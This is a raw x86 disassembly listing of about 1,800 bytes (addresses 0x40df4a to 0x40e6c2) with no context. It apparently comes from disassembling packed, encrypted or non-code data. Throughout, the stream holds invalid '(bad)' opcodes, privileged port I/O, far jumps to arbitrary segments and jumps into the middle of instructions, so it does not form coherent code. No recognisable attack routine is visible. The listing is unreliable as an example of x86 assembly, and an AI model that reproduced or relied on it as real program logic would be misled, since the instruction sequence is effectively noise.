  40df4a:	cmp    edi,DWORD PTR [esi+0x506c23e3]
  40df50:	push   cs
  40df51:	push   edi
  40df52:	mov    bl,0xa
  40df54:	push   ds
  40df55:	gs scas eax,DWORD PTR es:[edi]
  40df57:	add    eax,DWORD PTR [edi+0xc9e33e8]
  40df5d:	out    0x92,eax
  40df5f:	xchg   esi,eax
  40df60:	push   ss
  40df61:	push   0x4a4dfc23
  40df66:	fimul  WORD PTR [ecx+0x68]
  40df69:	inc    esi
  40df6a:	sbb    al,0xd9
  40df6c:	pop    eax
  40df6d:	sub    BYTE PTR [esi+0x44],ch
  40df70:	adc    cl,ch
  40df72:	cld    
  40df73:	xor    eax,0xe7daefad
  40df78:	lea    ebx,es:[esi+0x43575783]
  40df7f:	sub    eax,0x1b52824f
  40df84:	push   cs
  40df85:	inc    edi
  40df86:	add    al,0x9a
  40df88:	xchg   ecx,eax
  40df89:	push   DWORD PTR [eax+0x35]
  40df8c:	push   esi
  40df8d:	cdq    
  40df8e:	and    al,0xb4
  40df90:	pushf  
  40df91:	bound  edx,QWORD PTR ds:0xb118
  40df96:	xchg   ebp,eax
  40df97:	xchg   ecx,eax
  40df98:	je     0x40df59
  40df9a:	xor    BYTE PTR [edx],dl
  40df9c:	cs (bad) 
  40df9f:	nop
  40dfa0:	sbb    DWORD PTR [ebp+ebx*8-0x4f],edi
  40dfa4:	jne    0x40df86
  40dfa6:	fnstsw WORD PTR [ebp+0x56]
  40dfa9:	add    bl,bh
  40dfab:	sbb    ebx,ebx
  40dfad:	clc    
  40dfae:	rol    ecx,1
  40dfb0:	test   al,0xd5
  40dfb2:	mov    eax,ds:0xc0af5eed
  40dfb7:	mov    ds:0x1a262076,eax
  40dfbc:	adc    al,0x91
  40dfbe:	or     DWORD PTR [ebx],esi
  40dfc0:	shl    BYTE PTR [ebx+0x24],0x13
  40dfc4:	jne    0x40dff0
  40dfc6:	call   0x12d9:0xb75a4bd6
  40dfcd:	dec    eax
  40dfce:	push   esp
  40dfcf:	pushf  
  40dfd0:	jmp    0xb8f6cbb5
  40dfd5:	jne    0x40e02c
  40dfd7:	xchg   esp,eax
  40dfd8:	jo     0x40e03d
  40dfda:	je     0x40e04b
  40dfdc:	sbb    ebx,eax
  40dfde:	dec    ebp
  40dfdf:	xchg   ebx,eax
  40dfe0:	sbb    esp,edi
  40dfe2:	sbb    al,0x4a
  40dfe4:	or     dl,bl
  40dfe6:	retf   0x18c8
  40dfe9:	mov    esi,esi
  40dfeb:	lds    esp,FWORD PTR [edi]
  40dfed:	fld    TBYTE PTR [edx-0x42]
  40dff0:	push   ebx
  40dff1:	mov    dl,0x62
  40dff3:	cs (bad) 
  40dff6:	ror    DWORD PTR [ebx],1
  40dff8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dff9:	inc    edi
  40dffa:	mov    ah,0xe1
  40dffc:	bound  ecx,QWORD PTR [ecx+0x63819a16]
  40e002:	inc    edi
  40e003:	int3   
  40e004:	(bad)  
  40e005:	neg    DWORD PTR [edx+0x5847170f]
  40e00b:	lea    eax,[eax]
  40e00d:	ja     0x40dffe
  40e00f:	and    DWORD PTR [ebp+0x36744130],esi
  40e015:	pop    ecx
  40e016:	clc    
  40e017:	les    eax,FWORD PTR [ecx]
  40e019:	push   ebx
  40e01a:	sbb    DWORD PTR [eax-0x61],ebp
  40e01d:	shl    BYTE PTR [ebx+0x13cf91ce],0x60
  40e024:	pop    ebx
  40e025:	outs   dx,BYTE PTR ds:[esi]
  40e026:	or     bl,ah
  40e028:	leave  
  40e029:	in     eax,dx
  40e02a:	test   eax,0xa64d4ac8
  40e02f:	cmp    DWORD PTR [edi-0x78797d7f],edx
  40e035:	ret    0x8f75
  40e038:	or     eax,0x9792e720
  40e03d:	push   esi
  40e03e:	xchg   ebp,eax
  40e03f:	aaa    
  40e040:	repnz xchg esp,eax
  40e042:	mov    edi,0x76cbd71f
  40e047:	ret    0xb92
  40e04a:	inc    edi
  40e04b:	push   0xffffff8c
  40e04d:	(bad)  
  40e04e:	sub    bl,bl
  40e050:	mov    al,0x43
  40e052:	es stos BYTE PTR es:[edi],al
  40e054:	jne    0x40e093
  40e056:	mov    ds:0x768c8a53,eax
  40e05b:	inc    edi
  40e05c:	push   eax
  40e05d:	push   ebp
  40e05e:	sti    
  40e05f:	dec    ebx
  40e060:	push   es
  40e061:	aaa    
  40e062:	xor    eax,0x25470e85
  40e067:	sbb    DWORD PTR [ebx],esi
  40e069:	neg    DWORD PTR [ebx-0x36972ca1]
  40e06f:	cs dec ebx
  40e071:	aaa    
  40e072:	in     al,dx
  40e073:	push   eax
  40e074:	cmp    eax,0x67a4f57a
  40e079:	iret   
  40e07a:	xor    eax,DWORD PTR [ebx+0x6ab8adc8]
  40e080:	inc    ebp
  40e081:	push   edi
  40e082:	jl     0x40e0cf
  40e084:	shl    BYTE PTR [ebp+eax*8-0x746349d3],cl
  40e08b:	jg     0x40e0ae
  40e08d:	addr16 push esp
  40e08f:	in     al,0x90
  40e091:	mov    bh,0x59
  40e093:	loopne 0x40e063
  40e095:	ins    DWORD PTR es:[edi],dx
  40e096:	adc    DWORD PTR [ecx+0x19910a32],ecx
  40e09c:	lods   al,BYTE PTR ds:[esi]
  40e09d:	inc    BYTE PTR [eax+0x25206f30]
  40e0a3:	pop    ds
  40e0a4:	jp     0x40e0ed
  40e0a6:	aam    0x61
  40e0a8:	ins    DWORD PTR es:[edi],dx
  40e0a9:	push   ecx
  40e0aa:	or     al,0x62
  40e0ac:	xor    al,BYTE PTR [eax+eiz*4]
  40e0af:	int    0x41
  40e0b1:	jae    0x40e0d5
  40e0b3:	dec    edi
  40e0b4:	or     DWORD PTR [ebp+0x1a],eax
  40e0b7:	adc    BYTE PTR [edx+0x8],bl
  40e0ba:	std    
  40e0bb:	push   ebx
  40e0bc:	mov    esp,0x74aa3668
  40e0c1:	inc    eax
  40e0c2:	adc    ax,0x75b4
  40e0c6:	mov    edi,0xcd8966b9
  40e0cb:	mov    cl,0xd7
  40e0ce:	lock cmp DWORD PTR [edi+0x1],ebx
  40e0d2:	sub    edx,eax
  40e0d4:	js     0x40e0bd
  40e0d6:	cmp    eax,edx
  40e0d8:	shl    BYTE PTR [ebx],cl
  40e0da:	adc    BYTE PTR [edx+0xf8b465e],0x3f
  40e0e1:	leave  
  40e0e2:	pop    ebp
  40e0e3:	aaa    
  40e0e4:	or     al,BYTE PTR [eax-0x215b5f82]
  40e0ea:	push   ds
  40e0eb:	mov    WORD PTR [esp+eax*4+0x323aa14c],cs
  40e0f2:	jbe    0x40e095
  40e0f4:	jb     0x40e0c7
  40e0f6:	mov    fs,WORD PTR [edx+0x48121be5]
  40e0fc:	pop    esi
  40e0fd:	xor    eax,0x29202c6
  40e102:	mov    dl,0x7a
  40e104:	xchg   ebp,eax
  40e105:	nop
  40e106:	in     eax,dx
  40e107:	call   0x21a828a8
  40e10c:	push   esp
  40e10d:	loopne 0x40e0b3
  40e10f:	shl    DWORD PTR [eax-0x7394731d],0x3c
  40e116:	out    0x60,al
  40e118:	cmp    ch,BYTE PTR ds:[ebx-0x49]
  40e11c:	(bad)  
  40e11d:	jg     0x40e151
  40e11f:	xor    eax,0x48d90d76
  40e124:	cdq    
  40e125:	pop    edx
  40e126:	mov    bl,0xd1
  40e128:	pop    esi
  40e129:	test   DWORD PTR [edx],esi
  40e12b:	xchg   edi,eax
  40e12c:	and    al,0x69
  40e12e:	pop    ss
  40e12f:	dec    edi
  40e130:	rcl    BYTE PTR [ecx+0x22a06801],0x51
  40e137:	and    BYTE PTR [esp+eax*4],dl
  40e13a:	sbb    DWORD PTR [ebx],ebp
  40e13c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e13d:	test   DWORD PTR [ebp+0x11475574],esi
  40e143:	xchg   esp,eax
  40e144:	pop    es
  40e145:	ja     0x40e1b7
  40e147:	and    DWORD PTR [ebx-0x16],0x4c
  40e14b:	(bad)  
  40e14c:	gs rol ebp,1
  40e14f:	jecxz  0x40e14c
  40e151:	sub    dh,dl
  40e153:	sub    BYTE PTR [edi+0x3e],bl
  40e156:	jp     0x40e139
  40e158:	fld    TBYTE PTR [ebx]
  40e15a:	xchg   DWORD PTR [esp+ecx*2+0x6e1c94df],esi
  40e161:	out    dx,eax
  40e162:	loop   0x40e110
  40e164:	ins    BYTE PTR es:[edi],dx
  40e165:	sbb    al,0x73
  40e167:	fimul  DWORD PTR [eax]
  40e169:	fstp   QWORD PTR [esi+ebp*4]
  40e16c:	adc    BYTE PTR [ebx+0x76],dh
  40e16f:	pushf  
  40e170:	mov    esp,0xe08ada19
  40e175:	sub    DWORD PTR [ecx+ebp*8-0x588c91],0x2c2c18e8
  40e180:	push   ebp
  40e181:	pop    edx
  40e182:	mov    al,ds:0x799cb03e
  40e187:	inc    esp
  40e188:	out    dx,al
  40e189:	(bad)  [esi]
  40e18b:	pop    esi
  40e18c:	inc    ecx
  40e18d:	jno    0x40e1f9
  40e18f:	retf   0x7abc
  40e192:	push   edx
  40e193:	vshufps ymm0,ymm0,YMMWORD PTR [ecx-0x6d],0x2d
  40e199:	add    ch,bh
  40e19b:	outs   dx,BYTE PTR ds:[esi]
  40e19c:	jo     0x40e1f2
  40e19e:	and    al,0x6a
  40e1a0:	(bad)  
  40e1a2:	xor    al,0x60
  40e1a4:	outs   dx,DWORD PTR ds:[esi]
  40e1a5:	dec    esi
  40e1a6:	mov    bh,BYTE PTR [edx]
  40e1a8:	les    eax,FWORD PTR [edx]
  40e1aa:	xlat   BYTE PTR ds:[ebx]
  40e1ab:	or     al,0x42
  40e1ad:	dec    eax
  40e1ae:	leave  
  40e1af:	and    al,0x6c
  40e1b1:	pop    ss
  40e1b2:	dec    edi
  40e1b3:	inc    ecx
  40e1b4:	cmp    BYTE PTR [edi],0xbf
  40e1b7:	test   eax,0x4c4ec9d5
  40e1bc:	rol    BYTE PTR [ebx+edx*1],cl
  40e1bf:	jmp    0x40e1af
  40e1c1:	(bad)  
  40e1c2:	fst    st(2)
  40e1c4:	jne    0x40e1f1
  40e1c6:	test   al,0x9a
  40e1c8:	retf   
  40e1c9:	mov    bh,0xb1
  40e1cb:	push   ss
  40e1cc:	repnz (bad) 
  40e1ce:	mov    edi,DWORD PTR [ecx+eiz*2-0x46]
  40e1d2:	mov    esp,0xef364daf
  40e1d7:	add    eax,0x8fac6b68
  40e1dc:	call   0xe4c4:0xc884e586
  40e1e3:	xor    ch,BYTE PTR [eax]
  40e1e5:	pop    esi
  40e1e6:	cmp    al,0x76
  40e1e8:	xor    ebx,DWORD PTR [ebx]
  40e1ea:	dec    ebx
  40e1eb:	mov    ds:0x7cc8fae6,eax
  40e1f0:	ror    DWORD PTR [ecx+0x799581ad],1
  40e1f6:	inc    ebp
  40e1f7:	stc    
  40e1f8:	push   esi
  40e1f9:	loopne 0x40e1d1
  40e1fb:	mov    edx,0x942e4faa
  40e200:	xchg   ebp,edx
  40e202:	mov    ebx,0xb9c570b7
  40e207:	mov    edi,0x510f5aa3
  40e20c:	ins    DWORD PTR es:[edi],dx
  40e20d:	in     al,0x46
  40e20f:	test   DWORD PTR [ecx+eax*2+0x7e],edi
  40e213:	dec    esi
  40e214:	rol    BYTE PTR [ebp+0x37d76fe1],cl
  40e21a:	adc    eax,0xe0ca0804
  40e21f:	mov    ecx,0x9a19493a
  40e224:	jmp    0x3d04:0x2d4168d9
  40e22b:	and    al,BYTE PTR [ecx-0x4f]
  40e22e:	cmp    DWORD PTR [esi+0x7b3f47dc],edi
  40e234:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e235:	scas   eax,DWORD PTR es:[edi]
  40e236:	add    BYTE PTR [ebx-0x6],dh
  40e239:	enter  0xc4b,0xfb
  40e23d:	sub    DWORD PTR [eax-0x19c77ca9],eax
  40e243:	mov    ch,0x85
  40e245:	and    ch,BYTE PTR [ecx-0x75]
  40e248:	pop    edx
  40e249:	sub    bl,BYTE PTR [edx+ebx*4]
  40e24c:	cwde   
  40e24d:	fwait
  40e24e:	in     eax,0x1d
  40e250:	dec    BYTE PTR [esi]
  40e252:	test   DWORD PTR [eax+0x4f445ed2],0x8697dca6
  40e25c:	pop    ebp
  40e25d:	xor    edi,DWORD PTR [edx]
  40e25f:	mov    bh,0xe4
  40e261:	add    eax,0x371d2d2d
  40e266:	jbe    0x40e292
  40e268:	popf   
  40e269:	retf   0x613
  40e26c:	dec    esi
  40e26d:	aaa    
  40e26e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e26f:	mov    dl,BYTE PTR [eax-0x10]
  40e272:	cmp    DWORD PTR [ebx-0x7d],ecx
  40e275:	xchg   edi,eax
  40e276:	mov    esi,0xee075e4f
  40e27b:	jnp    0x40e202
  40e27d:	sub    al,0x6a
  40e27f:	fisub  DWORD PTR [edi+eax*2-0x69]
  40e283:	in     al,0xd3
  40e285:	pop    ss
  40e286:	ret    0x4c87
  40e289:	and    al,0x8c
  40e28b:	jl     0x40e2bb
  40e28d:	nop
  40e28e:	fcom   QWORD PTR [edx+0x59b6f5ae]
  40e294:	inc    ebp
  40e295:	jnp    0x40e2a1
  40e297:	dec    ebp
  40e298:	rcr    DWORD PTR [ecx],1
  40e29a:	jno    0x40e265
  40e29c:	inc    ecx
  40e29d:	les    esi,FWORD PTR [edx+0x40159265]
  40e2a3:	sti    
  40e2a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2a5:	pop    esp
  40e2a6:	call   0x6b79dd36
  40e2ab:	inc    DWORD PTR [edi+0x69]
  40e2ae:	adc    esi,0x6e4190fa
  40e2b4:	mov    al,0x36
  40e2b6:	xchg   edi,eax
  40e2b7:	fs ss cmp eax,0x7f84bd9f
  40e2be:	(bad)  
  40e2bf:	or     DWORD PTR [ecx+0xb],0xffffffe5
  40e2c3:	jnp    0x40e25e
  40e2c5:	ds ret 
  40e2c7:	test   BYTE PTR ds:0x9e222d98,bh
  40e2cd:	nop
  40e2ce:	inc    esp
  40e2cf:	mov    ah,0x63
  40e2d1:	mov    edi,0xbef01c03
  40e2d6:	adc    BYTE PTR [ebx+0x74],ch
  40e2d9:	shl    BYTE PTR [ebp+0x67],0xa4
  40e2dd:	les    eax,FWORD PTR [edi+0x4d]
  40e2e0:	mov    esi,0x5540eed
  40e2e5:	adc    ecx,0x53
  40e2e8:	inc    ecx
  40e2e9:	add    al,BYTE PTR [ecx-0x52]
  40e2ec:	rcl    BYTE PTR [edx],cl
  40e2ee:	adc    ebp,ebx
  40e2f0:	push   edx
  40e2f1:	loopne 0x40e2c3
  40e2f3:	lods   al,BYTE PTR ss:[esi]
  40e2f5:	dec    ebx
  40e2f6:	push   esp
  40e2f7:	mov    DWORD PTR ds:0xdedd879f,esi
  40e2fd:	xor    ebp,esp
  40e2ff:	add    ah,BYTE PTR [esp+ebx*8+0x78]
  40e303:	add    dh,cl
  40e305:	mov    dh,0x93
  40e307:	jbe    0x40e332
  40e309:	iret   
  40e30a:	pop    eax
  40e30b:	gs std 
  40e30d:	jge    0x40e36b
  40e30f:	cmp    al,0xb7
  40e311:	or     esi,edx
  40e313:	dec    ecx
  40e314:	xchg   edi,eax
  40e316:	dec    esp
  40e317:	mov    cl,0x66
  40e319:	cli    
  40e31a:	xchg   edi,eax
  40e31b:	and    edx,edi
  40e31d:	mov    eax,ds:0xcfa458b
  40e322:	pop    edx
  40e323:	sub    eax,0xccdf85c9
  40e328:	fisub  WORD PTR [edx-0x60]
  40e32b:	add    BYTE PTR [ecx+0x6d],ch
  40e32e:	mov    BYTE PTR [esp+edx*8+0x36],dh
  40e332:	add    al,0x7
  40e334:	in     eax,dx
  40e335:	out    0x62,al
  40e337:	adc    al,0x80
  40e339:	add    DWORD PTR [esi-0x44],eax
  40e33c:	repz xor DWORD PTR [eax+0x7d],0x1ba8fd07
  40e344:	in     al,dx
  40e345:	adc    ecx,DWORD PTR [edi-0x690331]
  40e34b:	jmp    0x40e330
  40e34d:	sbb    eax,0xa9544645
  40e352:	dec    edx
  40e353:	fucomi st,st(2)
  40e355:	jns    0x40e325
  40e357:	jbe    0x40e2da
  40e359:	scas   eax,DWORD PTR es:[edi]
  40e35a:	add    al,0x50
  40e35c:	jbe    0x40e328
  40e35e:	jmp    0x7281:0x5979a231
  40e365:	jle    0x40e2f2
  40e367:	sub    BYTE PTR [esi+0x27],dh
  40e36a:	adc    eax,0x5152a74f
  40e36f:	jb     0x40e371
  40e371:	xchg   esi,eax
  40e372:	test   eax,0xe5a5e610
  40e377:	shl    BYTE PTR ds:0x8f11f7ca,cl
  40e37d:	mov    bl,0x34
  40e37f:	cmp    ebp,DWORD PTR [ecx+0x445a5283]
  40e385:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e386:	call   0x6671389c
  40e38b:	cmp    BYTE PTR [esi],dl
  40e38d:	ss mov dl,0x3c
  40e391:	dec    ecx
  40e392:	outs   dx,BYTE PTR ds:[esi]
  40e393:	pop    eax
  40e394:	xor    al,0x82
  40e396:	stc    
  40e397:	jp     0x40e331
  40e399:	neg    BYTE PTR [edi-0x5369b8cb]
  40e39f:	clc    
  40e3a0:	sub    ecx,DWORD PTR ss:[esi]
  40e3a3:	out    dx,eax
  40e3a4:	mov    ebx,0xf6155bac
  40e3a9:	test   eax,0xdb18e77b
  40e3ae:	or     ebp,DWORD PTR [edi]
  40e3b0:	iret   
  40e3b1:	mov    ah,0x23
  40e3b3:	lds    ebp,FWORD PTR [esi+eiz*8-0x323184e]
  40e3ba:	jnp    0x40e3bf
  40e3bc:	mov    ebx,0xdcc54b74
  40e3c1:	xor    BYTE PTR [ebx+0x21],ah
  40e3c4:	lods   al,BYTE PTR ds:[esi]
  40e3c5:	(bad)  
  40e3c6:	repz ret 0xa181
  40e3ca:	into   
  40e3cb:	cmp    al,0x91
  40e3cd:	mov    cl,0xc9
  40e3cf:	xchg   edi,eax
  40e3d0:	pop    edx
  40e3d1:	fdiv   DWORD PTR [esi-0x63a7b0d]
  40e3d7:	adc    bl,BYTE PTR [edi+ecx*2+0x59]
  40e3db:	push   esi
  40e3dc:	loopne 0x40e396
  40e3de:	inc    eax
  40e3df:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40e3e1:	ins    BYTE PTR es:[edi],dx
  40e3e2:	ja     0xd91dd2f5
  40e3e8:	dec    edi
  40e3e9:	adc    ecx,DWORD PTR [edi-0x6e]
  40e3ec:	mov    WORD PTR [ebx],fs
  40e3ee:	push   eax
  40e3ef:	aad    0xd6
  40e3f1:	stos   DWORD PTR es:[edi],eax
  40e3f2:	or     ecx,DWORD PTR [eax+0x1e]
  40e3f5:	jp     0x40e470
  40e3f7:	call   0x110f:0xb2e2264b
  40e3fe:	jg     0x40e3d2
  40e400:	adc    al,0xdd
  40e402:	lods   eax,DWORD PTR ds:[esi]
  40e403:	mov    edi,0xa399f232
  40e408:	shr    BYTE PTR [edx],1
  40e40a:	ret    0x2135
  40e40d:	sub    dh,BYTE PTR [ebp-0x4f]
  40e410:	jb     0x40e485
  40e412:	jnp    0x40e3c0
  40e414:	fs cs inc edx
  40e417:	fcmovu st,st(6)
  40e419:	inc    esi
  40e41a:	sbb    eax,esi
  40e41c:	sbb    al,0x36
  40e41e:	cmp    DWORD PTR [esp+ebp*8+0x321ad788],0xffffffae
  40e426:	ret    
  40e427:	mov    ecx,0xf029f9f1
  40e42c:	mov    es,WORD PTR [edx]
  40e42e:	and    ah,BYTE PTR [esi+edi*8+0x391fe10d]
  40e435:	sbb    dl,0x7b
  40e438:	xchg   edx,eax
  40e439:	push   esi
  40e43a:	mov    eax,ds:0xe71a5941
  40e43f:	xchg   esp,eax
  40e440:	hlt    
  40e441:	xchg   esi,eax
  40e442:	mov    WORD PTR [edx+eax*2-0x7a],cs
  40e446:	imul   esi,DWORD PTR [edx+0x4786376b],0xffffffd7
  40e44d:	test   DWORD PTR [ebx+ecx*4],eax
  40e450:	mov    eax,0x3b6d2bf7
  40e455:	repz (bad) 
  40e457:	jae    0x40e49b
  40e459:	dec    edx
  40e45a:	scas   eax,DWORD PTR es:[edi]
  40e45b:	sbb    BYTE PTR [ecx],ah
  40e45d:	pop    ebx
  40e45e:	lea    esp,[esi]
  40e460:	adc    dl,BYTE PTR [ecx-0x79037cb6]
  40e466:	push   cs
  40e467:	clc    
  40e468:	(bad)  
  40e469:	enter  0xc984,0x9a
  40e46d:	mov    ebx,0x2b3d093b
  40e472:	hlt    
  40e473:	jl     0x40e466
  40e475:	bound  edi,QWORD PTR [esi]
  40e477:	dec    ecx
  40e478:	retf   
  40e479:	icebp  
  40e47a:	je     0x40e3fc
  40e47c:	pop    edi
  40e47d:	rol    DWORD PTR [ecx+0x2a6e5453],1
  40e483:	jl     0x40e463
  40e485:	pop    ebx
  40e486:	jg     0x40e4be
  40e488:	cmp    al,0x93
  40e48a:	xlat   BYTE PTR ss:[ebx]
  40e48c:	push   es
  40e48d:	(bad)  
  40e48e:	repnz pop eax
  40e490:	and    esi,ecx
  40e492:	cmp    cl,ah
  40e494:	pop    ds
  40e495:	mov    dl,0x69
  40e497:	pop    esi
  40e498:	dec    edx
  40e499:	(bad)  
  40e49a:	cs jle 0x40e492
  40e49d:	jae    0x40e4c0
  40e49f:	addr16 xchg esi,eax
  40e4a1:	ror    al,1
  40e4a3:	sbb    bh,BYTE PTR [ecx+0x46]
  40e4a6:	and    al,BYTE PTR [esi]
  40e4a8:	stos   DWORD PTR es:[edi],eax
  40e4a9:	mov    ebx,0x7acee24
  40e4ae:	std    
  40e4af:	js     0x40e496
  40e4b1:	mov    dl,0x70
  40e4b3:	hlt    
  40e4b4:	jmp    0x40e4bd
  40e4b6:	aad    0xe9
  40e4b8:	and    ah,BYTE PTR [esi+0x1056bf7e]
  40e4be:	push   ecx
  40e4bf:	or     eax,0x3d4d7eb
  40e4c4:	mov    edx,0xb71141d6
  40e4c9:	mov    eax,ds:0xdd76a494
  40e4ce:	test   al,0xa7
  40e4d0:	cmp    cl,BYTE PTR [esi+esi*4]
  40e4d3:	sti    
  40e4d4:	nop
  40e4d5:	pmullw mm4,QWORD PTR [eax-0x39]
  40e4d9:	or     esp,edx
  40e4db:	xchg   ebx,eax
  40e4dc:	sub    esi,DWORD PTR [ebp+0x59]
  40e4df:	in     eax,dx
  40e4e0:	aam    0x1
  40e4e2:	(bad)  
  40e4e3:	adc    eax,0x2d67df29
  40e4e8:	je     0x40e4d4
  40e4ea:	push   esi
  40e4eb:	add    eax,0x4aa53400
  40e4f0:	div    BYTE PTR [ecx]
  40e4f2:	pop    edx
  40e4f3:	jl     0x40e543
  40e4f5:	outs   dx,DWORD PTR ds:[esi]
  40e4f6:	push   ebx
  40e4f7:	cmp    eax,0xbae8e319
  40e4fc:	sub    BYTE PTR [edx+eiz*4+0x7c5d02f2],ch
  40e503:	ja     0x40e554
  40e505:	ss inc edx
  40e507:	fbld   TBYTE PTR [edx+0x714429a2]
  40e50d:	out    0x23,eax
  40e50f:	jmp    0x4bc0f4d0
  40e514:	or     eax,0x2d41725c
  40e519:	push   es
  40e51a:	ja     0x40e51d
  40e51c:	jno    0x40e552
  40e51e:	or     al,0x2d
  40e520:	enter  0xe71c,0xd2
  40e524:	jecxz  0x40e500
  40e526:	fnstenv [eax+0x44]
  40e529:	ret    
  40e52a:	fisttp DWORD PTR [ebx]
  40e52c:	mov    bl,0x17
  40e52e:	aaa    
  40e52f:	test   eax,0xa77a9c15
  40e534:	pop    es
  40e535:	pop    ss
  40e536:	sti    
  40e537:	sub    BYTE PTR [esp+edx*2-0x1c],ch
  40e53b:	sbb    eax,0xd000015d
  40e540:	pop    ebp
  40e541:	push   esp
  40e542:	lahf   
  40e543:	pop    edx
  40e544:	inc    esi
  40e545:	xor    BYTE PTR [ecx+0x7f10d584],cl
  40e54b:	xor    al,0xa2
  40e54d:	imul   ecx,ebp,0xfffffff9
  40e550:	pushf  
  40e551:	pop    ds
  40e552:	push   esp
  40e553:	inc    edi
  40e554:	adc    BYTE PTR [ebx+0x50],bh
  40e557:	mov    ebx,0xf32a290a
  40e55c:	jnp    0x40e560
  40e55e:	mov    ah,0xa1
  40e560:	mov    BYTE PTR [esi-0x4929808],dh
  40e566:	mov    ds:0x962f22fb,al
  40e56b:	lahf   
  40e56c:	pop    edx
  40e56d:	inc    ebp
  40e56e:	ins    BYTE PTR es:[edi],dx
  40e56f:	mov    ds:0xbb9932fa,eax
  40e574:	inc    esi
  40e575:	loope  0x40e520
  40e577:	outs   dx,BYTE PTR ss:[esi]
  40e579:	xchg   ebx,eax
  40e57a:	jl     0x40e512
  40e57c:	fisttp QWORD PTR [esi-0xca7e695]
  40e582:	ins    BYTE PTR es:[edi],dx
  40e583:	es jmp 0xe355:0xffa18271
  40e58b:	xchg   ebx,eax
  40e58c:	nop
  40e58d:	mov    dh,0xa8
  40e58f:	adc    ch,BYTE PTR [ebx+eax*2-0x2f089523]
  40e596:	enter  0x29f,0xa5
  40e59a:	adc    cl,bl
  40e59c:	out    dx,al
  40e59d:	ret    
  40e59e:	icebp  
  40e59f:	call   FWORD PTR [ecx-0x4a4edfaa]
  40e5a5:	out    0x6c,al
  40e5a7:	xor    al,0x8d
  40e5a9:	xor    ebx,edi
  40e5ab:	shr    DWORD PTR [edi],1
  40e5ad:	ja     0x40e5cc
  40e5af:	pop    ss
  40e5b0:	and    DWORD PTR [eax+0x7c],eax
  40e5b3:	and    eax,0xd1ae24ba
  40e5b8:	js     0x40e56f
  40e5ba:	xor    al,0x78
  40e5bc:	je     0x40e61b
  40e5be:	rcl    BYTE PTR ds:0xa35acc55,cl
  40e5c4:	push   ss
  40e5c5:	ds or  al,0x4a
  40e5c8:	int    0xe5
  40e5ca:	push   eax
  40e5cb:	daa    
  40e5cc:	lock pop esp
  40e5ce:	popf   
  40e5cf:	dec    edi
  40e5d0:	xchg   esp,eax
  40e5d1:	dec    ecx
  40e5d2:	xor    eax,0xb4cf7951
  40e5d7:	call   0xbcb501f
  40e5dc:	pop    eax
  40e5dd:	mov    WORD PTR es:[eax+0x23],?
  40e5e1:	popf   
  40e5e2:	nop
  40e5e3:	pop    esp
  40e5e4:	add    BYTE PTR [esi],0x76
  40e5e7:	fisubr DWORD PTR [edi]
  40e5e9:	push   0xb73c9f1b
  40e5ee:	fidiv  DWORD PTR ds:0x263d065a
  40e5f4:	fsubrp st(6),st
  40e5f6:	push   ss
  40e5f7:	ins    BYTE PTR es:[edi],dx
  40e5f8:	repnz loope 0x40e609
  40e5fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5fc:	sbb    BYTE PTR [esp+esi*8],bh
  40e5ff:	jne    0x40e644
  40e601:	lahf   
  40e602:	mov    ecx,DWORD PTR [esi-0x44]
  40e605:	repnz (bad) 
  40e607:	jne    0x40e60f
  40e609:	or     eax,0xceecd09
  40e60e:	inc    eax
  40e60f:	stc    
  40e610:	ds test ebx,ebp
  40e613:	neg    DWORD PTR [edx]
  40e615:	or     bl,BYTE PTR ds:0x667baf96
  40e61b:	push   ds
  40e61c:	xor    cl,ch
  40e61e:	cmp    al,0x6f
  40e620:	in     eax,dx
  40e621:	call   0x4113048c
  40e626:	jge    0x40e5f1
  40e628:	mov    edx,0x9f24b67b
  40e62d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e62e:	dec    esp
  40e62f:	fsub   st(5),st
  40e631:	jmp    0x40e66a
  40e633:	mov    ecx,0xc8cfc0d8
  40e638:	mov    esi,0xfc12aecb
  40e63d:	cmp    ebp,esi
  40e63f:	imul   esi,DWORD PTR [eax+0x5fdf540a],0x30
  40e646:	or     bl,BYTE PTR [edi-0x7f]
  40e649:	and    DWORD PTR [edi-0x56],edx
  40e64c:	add    ebx,DWORD PTR [edx+ecx*2+0x4b401ee1]
  40e653:	jae    0x40e6ca
  40e655:	sub    ch,dl
  40e657:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e658:	push   esp
  40e659:	addr16 pop ds
  40e65b:	int3   
  40e65c:	inc    esp
  40e65d:	stc    
  40e65e:	push   0xc9c13292
  40e663:	add    al,cl
  40e665:	dec    eax
  40e666:	mov    ah,ch
  40e668:	sti    
  40e669:	pusha  
  40e66a:	add    ebx,DWORD PTR [edi]
  40e66c:	mov    ebx,0x8791603
  40e671:	loope  0x40e69e
  40e673:	inc    edx
  40e674:	push   es
  40e675:	aad    0x3c
  40e677:	jae    0x40e618
  40e679:	ins    DWORD PTR es:[edi],dx
  40e67a:	jmp    0x10fac591
  40e67f:	pop    edi
  40e680:	cmc    
  40e681:	popf   
  40e682:	cdq    
  40e683:	(bad)  [esi-0x6a]
  40e686:	push   eax
  40e687:	dec    ebp
  40e688:	out    dx,eax
  40e689:	mov    ebx,0x9f281e07
  40e68e:	sbb    al,0x48
  40e690:	stos   BYTE PTR es:[edi],al
  40e691:	xor    ecx,0x170c0fb3
  40e697:	push   ebx
  40e698:	clc    
  40e699:	sub    esi,esp
  40e69b:	icebp  
  40e69c:	sub    ecx,DWORD PTR [edx+0x6cd5740a]
  40e6a2:	and    BYTE PTR [edi],al
  40e6a4:	push   esp
  40e6a5:	and    esi,DWORD PTR [esi+edi*4]
  40e6a8:	or     al,0xdb
  40e6aa:	repz cwde 
  40e6ac:	ins    BYTE PTR es:[edi],dx
  40e6ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6ae:	lock shr cl,cl
  40e6b1:	inc    eax
  40e6b2:	push   eax
  40e6b3:	das    
  40e6b4:	test   esp,edi
  40e6b6:	psubusb mm3,QWORD PTR ss:[edi+0x5c145295]
  40e6be:	cmp    BYTE PTR [esp+ebx*2+0x55],bh
  40e6c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
